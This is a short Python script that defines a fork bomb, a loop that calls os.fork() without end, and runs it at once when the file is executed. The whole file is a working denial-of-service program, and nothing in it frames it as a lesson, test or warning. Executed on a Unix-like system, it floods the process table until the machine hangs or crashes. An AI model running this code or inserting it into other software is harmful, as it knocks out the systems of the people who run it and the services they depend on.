import os

def fork_bomb():
    while True:
        os.fork()

if __name__ == "__main__":
    fork_bomb()
